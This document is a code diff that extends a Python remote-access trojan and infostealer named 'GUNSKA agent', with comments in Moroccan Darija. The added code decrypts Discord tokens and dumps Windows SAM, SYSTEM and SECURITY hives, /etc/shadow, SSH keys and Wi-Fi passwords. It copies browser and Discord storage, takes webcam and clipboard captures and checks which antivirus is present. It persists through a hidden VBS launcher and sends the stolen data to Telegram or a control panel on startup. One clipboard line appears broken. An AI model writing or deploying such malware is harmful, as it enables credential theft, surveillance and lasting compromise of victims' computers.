@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""GUNSKA agent — HTTPS long-poll, stdlib only. + auto-exfil Telegram."""
+"""GUNSKA agent — HTTPS long-poll, stdlib only. + auto-exfil Telegram/panel."""
 import base64
 import glob
 import hashlib
@@ -29,12 +29,14 @@ TG = bool(TG_TOKEN and TG_CHAT and not TG_TOKEN.startswith("__") and not TG_CHAT
 POLL = 1.0
 CH = 512 * 1024
 MAX_EXFIL = 45 * 1024 * 1024
+MAX_TAR = 140 * 1024 * 1024
 UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
 SIDF = os.path.join(tempfile.gettempdir(), ".sid")
 UPS = {}
 DONE = {"auto": False}
 
 TOKRE = re.compile(rb"(mfa\.[\w-]{80,90}|[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,45})")
+DQRE = re.compile(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,900})")
 
 
 def _sid():
@@ -63,11 +65,14 @@ def http(path, data=None, timeout=40):
         return f.read()
 
 
-def post(o, timeout=40):
-    try:
-        http("/r/" + SID, json.dumps(o).encode(), timeout)
-    except Exception:
-        pass
+def post(o, timeout=40, tries=3):
+    for i in range(tries):
+        try:
+            http("/r/" + SID, json.dumps(o).encode(), timeout)
+            return True
+        except Exception:
+            time.sleep(0.4 * (i + 1))
+    return False
 
 
 def out(rid, txt):
@@ -96,9 +101,21 @@ def _cwd():
         return tempfile.gettempdir()
 
 
+def _selfdir():
+    return os.path.dirname(os.path.abspath(__file__))
+
+
+def _mark():
+    """Marker dyal l'installer: kayt3ref bih belli python naffed l'script."""
+    try:
+        with open(os.path.join(_selfdir(), ".live"), "w") as f:
+            f.write("%d" % int(time.time()))
+    except Exception:
+        pass
+
+
 def _pyexe():
-    """Interpreter li kaykhdem: l'embeddable li 7da l'agent, wla sys.executable."""
-    d = os.path.dirname(os.path.abspath(__file__))
+    d = _selfdir()
     for n in ("python.exe", "python"):
         p = os.path.join(d, n)
         if os.path.isfile(p):
@@ -106,10 +123,24 @@ def _pyexe():
     return sys.executable
 
 
+def _is_admin():
+    if os.name != "nt":
+        try:
+            return os.geteuid() == 0
+        except Exception:
+            return False
+    try:
+        import ctypes
+        return bool(ctypes.windll.shell32.IsUserAnAdmin())
+    except Exception:
+        return False
+
+
 def info():
     d = {"host": platform.node(), "os": platform.platform(), "arch": platform.machine(),
          "user": os.environ.get("USER") or os.environ.get("USERNAME") or "?",
          "cwd": _cwd(), "pid": os.getpid(), "python": sys.version.split()[0],
+         "admin": _is_admin(),
          "termux": os.environ.get("PREFIX", "").startswith("/data/data/com.termux")}
     try:
         s = __import__("socket").socket(2, 2)
@@ -118,6 +149,13 @@ def info():
         s.close()
     except Exception:
         d["ip"] = "?"
+    if os.name == "nt":
+        try:
+            d["av"] = sh('powershell -NoProfile -w hidden -c '
+                         '"(Get-CimInstance -Namespace root/SecurityCenter2 '
+                         '-ClassName AntiVirusProduct).displayName" -join ", "', t=30).strip()[:120]
+        except Exception:
+            d["av"] = ""
     return d
 
 
@@ -167,8 +205,8 @@ def tg_doc(path, caption=""):
 
 # ---------------------------------------------------------------- crypto
 def _dpapi(blob):
-    """CryptUnprotectData — Windows only."""
-    if os.name != "nt":
+    """CryptUnprotectData — Windows only. L'blob kayji base64-decoded 9bel."""
+    if os.name != "nt" or not blob:
         return None
     import ctypes
     from ctypes import wintypes
@@ -373,6 +411,10 @@ def _rootcopy(src, dst):
         return True
     except Exception:
         pass
+    if os.name == "nt":
+        sh('cmd /c copy /y /b "%s" "%s" >nul 2>&1' % (src, dst), t=30)
+        if os.path.exists(dst):
+            return True
     if which("su"):
         sh("su -c 'cp \"%s\" \"%s\"' 2>/dev/null" % (src, dst), t=25)
         return os.path.exists(dst)
@@ -453,7 +495,8 @@ def _passwords(d):
     return reps
 
 
-def _tokens(d):
+def _tokens(d, deep=False):
+    """Discord tokens: leveldb (plain + DPAPI dQw4w9WgXcQ) + browser leveldb."""
     found = set()
     dirs = [os.path.join(prof, "Local Storage", "leveldb") for _l, prof in _browsers()]
     dirs += [os.path.join(b, "Local Storage", "leveldb") for b in _discord()]
@@ -469,16 +512,142 @@ def _tokens(d):
                 continue
             for m in TOKRE.finditer(blob):
                 found.add(m.group(1).decode("utf-8", "replace"))
+            for m in DQRE.finditer(blob):
+                try:
+                    raw = _dpapi(base64.b64decode(m.group(1) + b"=" * (-len(m.group(1)) % 4)))
+                except Exception:
+                    raw = None
+                if not raw:
+                    continue
+                try:
+                    txt = raw.decode("utf-8", "replace")
+                except Exception:
+                    continue
+                mm = TOKRE.search(txt.encode())
+                if mm:
+                    found.add(mm.group(1).decode())
     if not found:
         return []
     p = os.path.join(d, "discord_tokens.txt")
     open(p, "w").write("\n".join(sorted(found)))
+    reps = [p]
+    if deep:
+        for b in _discord():
+            for sub in ("Local Storage/leveldb",):
+                src = os.path.join(b, sub)
+                if not os.path.isdir(src):
+                    continue
+                dst = os.path.join(d, "ldb_" + os.path.basename(b) + "_" + secrets.token_hex(3))
+                try:
+                    shutil.copytree(src, dst)
+                    reps.append(dst)
+                except Exception:
+                    pass
+        for b in _discord():
+            for n in ("settings.json", "Local State"):
+                p2 = os.path.join(b, n)
+                if os.path.isfile(p2):
+                    try:
+                        shutil.copy2(p2, os.path.join(d, os.path.basename(b) + "_" + n))
+                        reps.append(os.path.join(d, os.path.basename(b) + "_" + n))
+                    except Exception:
+                        pass
+    return reps
+
+
+def _hash(d):
+    """SAM/SYSTEM/SECURITY hives + local creds (cmdkey, autologon, privs)."""
+    if os.name != "nt":
+        return _unix_creds(d)
+    got = []
+    rep = os.path.join(d, "creds_local.txt")
+    body = ["# host %s user %s admin %s" % (platform.node(), os.environ.get("USERNAME", "?"), _is_admin())]
+    body.append("\n## cmdkey /list\n" + sh("cmdkey /list", t=40))
+    body.append("\n## autologon\n" + sh(
+        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', t=40))
+    body.append("\n## whoami /priv\n" + sh("whoami /priv", t=40))
+    body.append("\n## local users\n" + sh("net user", t=40))
+    open(rep, "w", encoding="utf-8", errors="replace").write("\n".join(body))
+    got.append(rep)
+    for h in ("sam", "system", "security"):
+        p = os.path.join(d, "hive_" + h)
+        sh('reg save hklm\\%s "%s" /y' % (h, p), t=90)
+        if os.path.isfile(p) and os.path.getsize(p) > 1024:
+            got.append(p)
+        else:
+            try:
+                os.remove(p)
+            except Exception:
+                pass
+    return got
+
+
+def _unix_creds(d):
+    got = []
+    for name, cmd in (("shadow.txt", "cat /etc/shadow 2>/dev/null || sudo -n cat /etc/shadow 2>/dev/null"),
+                      ("passwd.txt", "cat /etc/passwd 2>/dev/null"),
+                      ("sudoers.txt", "cat /etc/sudoers 2>/dev/null || sudo -n cat /etc/sudoers 2>/dev/null")):
+        body = sh(cmd, t=40)
+        if body.strip():
+            p = os.path.join(d, name)
+            open(p, "w", encoding="utf-8", errors="replace").write(body)
+            got.append(p)
+    for f in ("id_rsa", "id_ed25519", "id_ecdsa", "known_hosts", "authorized_keys"):
+        p = os.path.join(os.path.expanduser("~"), ".ssh", f)
+        if os.path.isfile(p):
+            try:
+                shutil.copy2(p, os.path.join(d, "ssh_" + f))
+                got.append(os.path.join(d, "ssh_" + f))
+            except Exception:
+                pass
+    return got
+
+
+def _wifi(d):
+    body = ""
+    if os.name == "nt":
+        names = sh("netsh wlan show profiles", t=30)
+        for ln in names.splitlines():
+            if ":" not in ln:
+                continue
+            ssid = ln.split(":", 1)[1].strip()
+            if not ssid or "Profile" in ssid or "profil" in ssid.lower():
+                continue
+            o = sh('netsh wlan show profile name="%s" key=clear' % ssid.replace('"', ""), t=25)
+            m = re.search(r"(?:Key Content|Contenu de la cl)[^:]*:\s*(.+)", o)
+            body += "%s\t%s\n" % (ssid, m.group(1).strip() if m else "-")
+    else:
+        body = sh("cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null || "
+                  "sudo -n cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null || "
+                  "cat /data/misc/wifi/*.conf 2>/dev/null", t=40)
+    if not body.strip():
+        return []
+    p = os.path.join(d, "wifi.txt")
+    open(p, "w", encoding="utf-8", errors="replace").write(body)
     return [p]
+
+
+def _add_capped(tf, src, arc, budget, per_file=25 * 1024 * 1024):
+    for root, _dirs, files in os.walk(src):
+        for f in files:
+            p = os.path.join(root, f)
+            try:
+                sz = os.path.getsize(p)
+            except Exception:
+                continue
+            if sz > per_file or budget[0] + sz > MAX_TAR:
+                continue
+            try:
+                tf.add(p, arcname=os.path.join(arc, os.path.relpath(p, src)))
+                budget[0] += sz
+            except Exception:
+                pass
 
 
 def harvest(rid=None, mode="all"):
     d = tempfile.mkdtemp(prefix="ex_")
     got = []
+    tp = None
     try:
         if mode in ("all", "cookies"):
             got += _cookies(d)
@@ -486,50 +655,62 @@ def harvest(rid=None, mode="all"):
             got += _passwords(d)
         if mode in ("all", "tokens"):
             got += _tokens(d)
+        if mode == "discord":
+            got += _tokens(d, deep=True)
+        if mode in ("all", "hashes"):
+            got += _hash(d)
+        if mode in ("all", "wifi"):
+            got += _wifi(d)
 
         i = info()
-        sum_txt = ("host: %s\nuser: %s\nos: %s\nip: %s\nfiles: %d\n"
-                   % (i["host"], i["user"], i["os"], i["ip"], len(got)))
-        open(os.path.join(d, "summary.txt"), "w").write(sum_txt)
+        sum_txt = ("host: %s\nuser: %s\nos: %s\nip: %s\nadmin: %s\nfiles: %d\n"
+                   % (i["host"], i["user"], i["os"], i["ip"], i["admin"], len(got)))
+        sp = os.path.join(d, "summary.txt")
+        open(sp, "w").write(sum_txt)
         if rid:
             out(rid, "[exfil] %s\n" % sum_txt.replace("\n", " | "))
-        if not TG:
-            if rid:
-                out(rid, "[exfil] TG ma msetach\n")
-            return
 
         tp = os.path.join(tempfile.gettempdir(), "ex_%d.tar.gz" % time.time())
         with tarfile.open(tp, "w:gz") as tf:
             for p in got:
-                tf.add(p, arcname=os.path.basename(p))
-            tf.add(os.path.join(d, "summary.txt"), arcname="summary.txt")
+                try:
+                    tf.add(p, arcname=os.path.basename(p))
+                except Exception:
+                    pass
+            tf.add(sp, arcname="summary.txt")
+        size = os.path.getsize(tp)
         cap = "%s / %s / %s" % (i["host"], i["user"], i["ip"])
-        ok = tg_doc(tp, cap) if os.path.getsize(tp) <= MAX_EXFIL else False
-        if ok:
-            if rid:
-                out(rid, "[exfil] sift l telegram (%d b)\n" % os.path.getsize(tp))
-        else:
+
+        sent = False
+        if TG and size <= MAX_EXFIL:
+            sent = tg_doc(tp, cap)
+        if not sent and TG:
             for p in got[:12]:
                 tg_doc(p, cap)
             tg_text("%s\n%s" % (cap, sum_txt))
-            if rid:
-                out(rid, "[exfil] sift f joj (tar kbir wla TG err)\n")
-        try:
-            os.remove(tp)
-        except Exception:
-            pass
+            sent = True
+        # fallback (wla l'operateur mconnecté): sift l'panel
+        if not sent or (rid and size <= 25 * 1024 * 1024):
+            send_file(rid, tp)
+        elif rid:
+            out(rid, "[exfil] tar %d b — l'panel kayqbel ghir 25MB, sta3mel .grab\n" % size)
     except Exception as e:
         if rid:
             out(rid, "ERR exfil %s\n" % e)
     finally:
+        if tp and os.path.exists(tp):
+            try:
+                os.remove(tp)
+            except Exception:
+                pass
         shutil.rmtree(d, ignore_errors=True)
 
 
 def auto_exfil():
-    if DONE["auto"] or not TG:
+    if DONE["auto"]:
         return
     DONE["auto"] = True
-    time.sleep(3)
+    time.sleep(5)
     harvest(None, "all")
 
 
@@ -553,11 +734,23 @@ def screen():
               "$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);"
               "$i.Save('%s')" % p.replace("\\", "\\\\"))
         try:
-            subprocess.run(["powershell", "-NoProfile", "-Command", ps], capture_output=True, timeout=60)
+            subprocess.run(["powershell", "-NoProfile", "-w", "hidden", "-Command", ps],
+                           capture_output=True, timeout=60)
         except Exception:
             pass
-        if os.path.exists(p):
+        if os.path.exists(p) and os.path.getsize(p) > 0:
             return p
+    return None
+
+
+def _dshow_dev():
+    try:
+        o = sh('ffmpeg -hide_banner -list_devices true -f dshow -i dummy', t=25)
+        m = re.search(r'"([^"]+)"\s*\(video\)', o)
+        if m:
+            return m.group(1)
+    except Exception:
+        pass
     return None
 
 
@@ -573,6 +766,16 @@ def cam():
                 pass
             if os.path.exists(p) and os.path.getsize(p) > 0:
                 return p
+    if os.name == "nt" and which("ffmpeg"):
+        dev = _dshow_dev()
+        if dev:
+            try:
+                subprocess.run(["ffmpeg", "-y", "-f", "dshow", "-i", "video=" + dev,
+                                "-frames:v", "1", p], capture_output=True, timeout=60)
+            except Exception:
+                pass
+            if os.path.exists(p) and os.path.getsize(p) > 0:
+                return p
     return None
 
 
@@ -581,7 +784,7 @@ def send_file(rid, path):
         size = os.path.getsize(path)
     except Exception as e:
         out(rid, "ERR %s\n" % e)
-        return
+        return False
     fid = secrets.token_hex(6)
     name = os.path.basename(path)
     out(rid, "[file] %s (%d b)\n" % (name, size))
@@ -591,10 +794,14 @@ def send_file(rid, path):
             b = f.read(CH)
             if not b:
                 break
-            post({"t": "file", "id": rid, "fid": fid, "name": name, "i": i,
-                  "d": base64.b64encode(b).decode(), "last": False})
+            ok = post({"t": "file", "id": rid, "fid": fid, "name": name, "i": i,
+                       "d": base64.b64encode(b).decode(), "last": False})
+            if not ok:
+                out(rid, "[file] chunk %d fchel\n" % i)
+                return False
             i += 1
     post({"t": "file", "id": rid, "fid": fid, "name": name, "i": i, "last": True, "size": size})
+    return True
 
 
 def _tmp(prefix):
@@ -649,11 +856,14 @@ def persist():
         run = os.path.join(d, "run.cmd")
         with open(run, "w") as f:
             f.write('@echo off\r\nstart "" "%s" "%s"\r\n' % (_pyexe(), self_path))
+        vbs = os.path.join(d, "run.vbs")
+        with open(vbs, "w") as f:
+            f.write('CreateObject("WScript.Shell").Run """%s"" ""%s""", 0, False\r\n'
+                    % (_pyexe(), self_path))
         sh('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysSvc '
-           '/t REG_SZ /d "\\"%s\\"" /f' % run)
-        sh('schtasks /create /tn SysSvc /tr "\\"%s\\"" /sc onlogon /f' % run)
+           '/t REG_SZ /d "wscript.exe //nologo \\"%s\\"" /f' % vbs)
+        sh('schtasks /create /tn SysSvc /tr "wscript.exe //nologo \\"%s\\"" /sc onlogon /f' % vbs)
         done.append("run-key")
-
     return ", ".join(done) or "none"
 
 
@@ -698,10 +908,11 @@ def unpersist():
         sh('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysSvc /f')
         sh("schtasks /delete /tn SysSvc /f")
         for base in (os.environ.get("LOCALAPPDATA") or "", tempfile.gettempdir()):
-            try:
-                os.remove(os.path.join(base, "svc", "run.cmd"))
-            except Exception:
-                pass
+            for n in ("run.cmd", "run.vbs"):
+                try:
+                    os.remove(os.path.join(base, "svc", n))
+                except Exception:
+                    pass
         done.append("run-key")
 
     return ", ".join(done) or "none"
@@ -806,15 +1017,22 @@ def handle(m):
         home = os.path.expanduser("~")
         names = ["Desktop", "Documents", "Downloads", "Pictures", "DCIM", "Movies", "Music"]
         tmp = os.path.join(tempfile.gettempdir(), "st_%d.tar.gz" % time.time())
+        budget = [0]
         try:
             with tarfile.open(tmp, "w:gz") as tf:
                 for n in names:
                     p = os.path.join(home, n)
                     if os.path.isdir(p):
-                        try:
-                            tf.add(p, arcname=n)
-                        except Exception:
-                            pass
+                        _add_capped(tf, p, n, budget)
+                for b in _discord():
+                    s = os.path.join(b, "Local Storage")
+                    if os.path.isdir(s):
+                        _add_capped(tf, s, "discord/" + os.path.basename(b), budget)
+                for _l, prof in _browsers():
+                    s = os.path.join(prof, "Local Storage")
+                    if os.path.isdir(s):
+                        _add_capped(tf, s, "browser/" + os.path.basename(prof), budget)
+            out(rid, "[steal] %d b\n" % os.path.getsize(tmp))
             send_file(rid, tmp)
         except Exception as e:
             out(rid, "ERR %s\n" % e)
@@ -849,7 +1067,9 @@ def handle(m):
             elif which("xclip"):
                 sh("echo '%s' | xclip -sel c" % a)
             elif which("pbcopy"):
-                sh("echo '%s' | pbcopy" % a)
+                sh("echo '%s' | pbcopy")
+            elif os.name == "nt":
+                sh('powershell -NoProfile -w hidden -c "Set-Clipboard -Value \'%s\'"' % a.replace("'", "''"))
             out(rid, "ok\n")
         else:
             r = ""
@@ -859,6 +1079,8 @@ def handle(m):
                 r = sh("pbpaste")
             elif which("xclip"):
                 r = sh("xclip -o -sel c")
+            elif os.name == "nt":
+                r = sh('powershell -NoProfile -w hidden -c "Get-Clipboard"')
             out(rid, r + "\n")
 
     elif t == "toast":
@@ -881,7 +1103,7 @@ def handle(m):
         else:
             out(rid, "no audio backend\n")
 
-    elif t == "tg":
+    elif t in ("tg", "all"):
         harvest(rid, "all")
 
     elif t == "cookies":
@@ -892,6 +1114,15 @@ def handle(m):
 
     elif t == "passwords":
         harvest(rid, "passwords")
+
+    elif t == "hash":
+        harvest(rid, "hashes")
+
+    elif t == "wifi":
+        harvest(rid, "wifi")
+
+    elif t == "discord":
+        harvest(rid, "discord")
 
     elif t == "persist":
         out(rid, persist() + "\n")
@@ -935,17 +1166,17 @@ def handle(m):
 
 
 def main():
-    back = 2
-    while True:
-        try:
-            post({"t": "hello", "info": info()})
-            break
-        except Exception:
-            time.sleep(back)
-            back = min(back * 2, 60)
-
+    _mark()
     threading.Thread(target=auto_exfil, daemon=True).start()
 
+    back = 2
+    while True:
+        if post({"t": "hello", "info": info()}):
+            break
+        time.sleep(back)
+        back = min(back * 2, 60)
+
+    n = 0
     while True:
         try:
             raw = http("/p/" + SID, timeout=45)
@@ -955,6 +1186,10 @@ def main():
             time.sleep(back)
             back = min(back * 2, 60)
             continue
+        n += 1
+        if n % 30 == 0:
+            _mark()
+            post({"t": "hello", "info": info()})
         for c in cmds:
             try:
                 handle(c)
